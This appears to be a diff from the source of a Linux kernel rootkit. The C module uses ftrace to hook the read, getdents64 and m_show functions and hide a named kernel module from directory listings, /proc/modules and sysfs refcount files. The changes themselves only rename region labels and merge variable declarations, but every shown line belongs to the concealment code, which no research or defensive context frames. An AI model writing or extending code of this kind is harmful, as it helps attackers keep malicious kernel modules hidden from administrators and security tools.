@@ -36,7 +36,7 @@ void m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftra
 typedef int (*original_m_show_t)(struct seq_file *seq, void *v);
 static original_m_show_t original_m_show_ptr;
 static struct ftrace_ops m_show_ops = { .func = m_show_callback_func, .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY };
-#pragma endregion
+#pragma endregion hook_consts
 
 #pragma region utils
 void notrace callback_func_base(struct pt_regs *regs, unsigned long parent_ip, unsigned long func_pointer)  {
@@ -60,7 +60,7 @@ int already_uses(struct module *a, struct module *b)
     
 	return 0;
 }
-#pragma endregion
+#pragma endregion utils
 
 #pragma region read_hook
 ssize_t new_read(const struct pt_regs *regs) {
@@ -70,10 +70,8 @@ ssize_t new_read(const struct pt_regs *regs) {
         return bytes_read;
     }
 
-    char *allocated_path_pointer;
-    allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
-    char *path;
-    path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
+    char *allocated_path_pointer = kmalloc(PATH_MAX, GFP_KERNEL);
+    char *path = d_path(&file->f_path, allocated_path_pointer, PATH_MAX);
         
     if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, refcount_path) != NULL) && bytes_read > 0) {
         char *current_module_name = file->f_path.dentry->d_parent->d_iname;
@@ -111,7 +109,7 @@ ssize_t new_read(const struct pt_regs *regs) {
 void notrace read_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
     callback_func_base(regs, parent_ip, (unsigned long)new_read);
 }
-#pragma endregion
+#pragma endregion read_hook
 
 #pragma region get_dents64_hook
 int new_getdents64(const struct pt_regs *regs) {
@@ -180,7 +178,7 @@ int new_getdents64(const struct pt_regs *regs) {
 void notrace get_dents64_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
     callback_func_base(regs, parent_ip, (unsigned long)new_getdents64);
 }
-#pragma endregion
+#pragma endregion get_dents64_hook
 
 #pragma region m_show_hook
 int new_m_show(struct seq_file *m, void *p) {
@@ -196,7 +194,7 @@ int new_m_show(struct seq_file *m, void *p) {
 void notrace m_show_callback_func(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *op, struct pt_regs *regs) {
     callback_func_base(regs, parent_ip, (unsigned long)new_m_show);
 }
-#pragma endregion
+#pragma endregion m_show_hook
 
 int load(void) {
     if (mod_name_to_hide == NULL) {
